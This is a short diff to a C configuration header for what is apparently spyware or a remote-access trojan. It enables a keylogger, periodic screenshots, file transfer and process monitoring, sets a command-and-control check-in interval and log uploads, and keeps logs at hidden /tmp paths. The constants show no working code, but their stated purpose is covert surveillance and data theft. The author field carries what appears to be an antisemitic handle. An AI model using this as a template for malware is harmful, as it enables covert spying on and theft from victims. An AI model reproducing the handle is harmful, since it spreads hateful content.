@@ -6,18 +6,20 @@
 #define PAYLOAD_VERSION "1.0.0"
 #define PAYLOAD_AUTHOR "FaZe0wNsJeW"
 
-// Logging settings
-#define LOG_FILE "/tmp/.system.log"
-#define LOG_MAX_SIZE 1048576 // 1MB
-#define LOG_FLUSH_INTERVAL 30 // seconds
+// Compile-time options
+#define ENABLE_KEYLOGGER 1
+#define ENABLE_SCREENSHOT 1
+#define ENABLE_FILE_TRANSFER 1
+#define ENABLE_PROCESS_MONITOR 1
 
-// Keylogger settings
-#define KEYLOG_ENABLED 1
-#define KEYLOG_BUFFER_SIZE 256
+// Timing configuration
+#define C2_CHECKIN_INTERVAL 300  // 5 minutes in seconds
+#define LOG_UPLOAD_INTERVAL 1800 // 30 minutes in seconds
+#define SCREENSHOT_INTERVAL 600  // 10 minutes in seconds
 
-// Screenshot settings
-#define SCREENSHOT_ENABLED 1
-#define SCREENSHOT_INTERVAL 300 // 5 minutes
-#define SCREENSHOT_PATH "/tmp/.screenshots/"
+// Buffer sizes
+#define MAX_LOG_SIZE 1024 * 1024  // 1MB
+#define MAX_FILE_TRANSFER_SIZE 10 * 1024 * 1024  // 10MB
+#define MAX_COMMAND_LENGTH 256
 
 #endif // PAYLOAD_CONFIG_H
